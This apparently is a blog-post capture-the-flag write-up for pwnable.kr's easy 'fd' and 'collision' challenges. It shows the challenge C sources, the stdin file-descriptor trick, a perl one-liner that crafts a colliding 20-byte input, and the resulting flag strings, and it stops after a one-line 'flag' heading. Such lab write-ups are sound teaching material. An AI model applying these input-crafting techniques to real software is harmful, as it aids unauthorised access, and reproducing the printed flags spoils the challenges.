---
layout : post
title : pwnable.kr Toddler's Bottle (easy) write-up
comments : true
---

[pwnable.kr](http://pwnable.kr) has a collection of pwning problems with a wide range of difficulty. This article is the write-up for Toddler's Bottle (easy) section.  

**fd**  (10/26/2015)  

This is the easiest problem and is about Linux file descriptor. As given, connect to the server `ssh fd@pwnable.kr -p 2222`.  

```
fd@ubuntu:~$ ls -al
total 32
drwxr-x---  4 root fd   4096 Aug 20  2014 .
dr-xr-xr-x 55 root root 4096 Sep 20 23:22 ..
d---------  2 root root 4096 Jun 12  2014 .bash_history
-r-sr-x---  1 fd2  fd   7322 Jun 11  2014 fd
-rw-r--r--  1 root root  418 Jun 11  2014 fd.c
-r--r-----  1 fd2  root   50 Jun 11  2014 flag
dr-xr-xr-x  2 root root 4096 Aug 20  2014 .irssi
```

It seems that you can read the source code for the program `fd`.

```C
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

So it seems that when `buf == "LETMEWIN\n`, you can get the flag. Since `fd == 0` is `stdin`, all you need to do is to give 0x1234 (4660 in decimal) as argv[1] and input "LETMEWIN\n"  

```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

Flag is: __mommy! I think I know what a file descriptor is!!__  
  

**collision** (10/26/2015)  
Similar to `fd`, you can read the source code for the program `col`.  

```C
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

At `int *ip = (int*)p`, `const char *p` is casted to `int *`. Since the size of `int` is 4 bytes and the size of `char` is 1 byte, the sum of five `int` blocks needs to be `0x21DD09EC`. Since `0x21DD09EC = 0x06C5CEC8 * 4 + 0x06C5CECC` and the system is little-endian, your injection code should be:  

```
col@ubuntu:~$ ./col $(perl -e 'print "\xc8\xce\xc5\x06"x4 . "\xcc\xce\xc5\x06"')
daddy! I just managed to create a hash collision :)
```

Flag is: __daddy! I just managed to create a hash collision :)__  
  

**flag** (10/26/2015)  
This is a reversing problem.
